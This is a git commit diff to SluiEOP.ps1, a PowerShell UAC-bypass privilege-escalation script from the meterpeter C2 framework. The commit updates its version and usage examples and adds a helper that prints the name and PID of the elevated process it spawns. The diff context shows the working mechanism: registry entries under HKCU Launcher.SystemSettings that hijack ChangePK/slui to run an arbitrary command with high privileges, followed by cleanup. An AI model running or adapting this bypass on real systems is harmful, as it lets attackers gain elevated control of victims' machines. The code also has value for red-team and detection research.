d45ba66a645f72cf58a5dad3cb3a88d768bb995c
pedro ubuntu <r00t-3xp10it@users.noreply.github.com>
2020-08-02 10:58:34 +0100

    Update SluiEOP.ps1
    Helper - Get the spawned <ProcessName> and <PID>

--- mimiRatz/SluiEOP.ps1
+++ mimiRatz/SluiEOP.ps1
@@ -7,7 +7,7 @@
    EOP Disclosure By: @mattharr0ey
    Required Dependencies: none
    Optional Dependencies: none
-   PS Script Dev Version: v1.4
+   PS Script Dev Version: v1.5
 
 .DESCRIPTION
    How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
@@ -22,11 +22,11 @@
    This script 'reverts' regedit hacks to the previous state before the EOP.
 
 .EXAMPLE
-   PS C:\> powershell.exe -File SluiEOP.ps1 "powershell.exe"
+   PS C:\> ./SluiEOP.ps1 "$env:WINDIR\System32\WindowsPowerShell\v1.0\powershell.exe"
    Execute powershell process with high privileges (SYSTEM)
 
 .EXAMPLE
-   PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad"
+   PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
    Execute notepad process with high privileges (SYSTEM)
 
 .EXAMPLE
@@ -43,12 +43,11 @@
     https://github.com/r00t-3xp10it/meterpeter
     https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/SluiEOP.ps1
     https://medium.com/@mattharr0ey/privilege-escalation-uac-bypass-in-changepk-c40b92818d1b
-
 #>
 
 
-$Command = $Null;
-$param1 = $args[0] # User Inputs [Arguments]
+$Command = $Null
+$param1 = $args[0] # User Inputs [<Arguments>]
 If(-not($param1) -or $param1 -eq $null){
    $Command = "$env:WINDIR\System32\cmd.exe"
 }else{
@@ -61,8 +60,9 @@ If($CheckVuln -eq $True){
 
    ## For those who run SluiEOP.ps1 outside meterpeter C2
    If(-not(Test-Path "$env:TMP\Update-KB4524147.ps1")){
-      Write-Host "SluiEOP v1.4 - By: r00t-3xp10it (SSA RedTeam)" -ForeGroundColor Green
+      Write-Host "SluiEOP v1.5 - By: r00t-3xp10it (SSA RedTeam @2020)" -ForeGroundColor Green
       Write-Host "[+] Executing Command: '$Command'"
+      $DetailedDataDump = $True
    }
 
    ### Add Entrys to Regedit { using powershell }
@@ -91,6 +91,50 @@ If($CheckVuln -eq $True){
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
    Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
+
+   <#
+   .SYNOPSIS
+      Helper - Get the spawned <ProcessName> and <PID>
+      Author: @r00t-3xp10it
+
+   .DESCRIPTION
+      Display a More Detailed Information for those who run SluiEOP outside meterpeter C2
+
+   .EXAMPLE
+      PS C:\> ./SluiEOP.ps1 "C:\Windows\System32\cmd.exe /c start notepad.exe"
+
+      ProccessName PID
+      ------------ ---
+      notepad      5543
+   #>
+
+   If($DetailedDataDump -eq $True){
+      If(-not($Command -match ' ') -and $Command -match '\\'){
+         $ParsingData = $Command -Split('\\')
+         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+         If($ProcessName -match '.exe'){
+            $ProcessName = $ProcessName -replace '.exe',''
+            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         }else{
+            $EOPID = "null"
+         }
+      }else{
+         $ParsingData = $Command -Split(' ')
+         $ProcessName = $ParsingData|Select -Last 1 -EA SilentlyContinue
+         If($ProcessName -match '.exe'){
+            $ProcessName = $ProcessName -replace '.exe',''
+            $EOPID = Get-Process $ProcessName -EA SilentlyContinue|Select -Last 1|Select-Object -ExpandProperty Id
+         }else{
+            $EOPID = "null"
+         }
+      }
+
+      ## Build PSObject Table Object
+      $DumpProcessPID = New-Object -TypeName PSObject
+      $DumpProcessPID | Add-Member -MemberType "NoteProperty" -Name "ProcessName" -Value "$ProcessName"
+      $DumpProcessPID | Add-Member -MemberType "NoteProperty" -Name "PID" -Value "$EOPID"
+      $DumpProcessPID
+   }
 
 }else{
    echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\fail.log
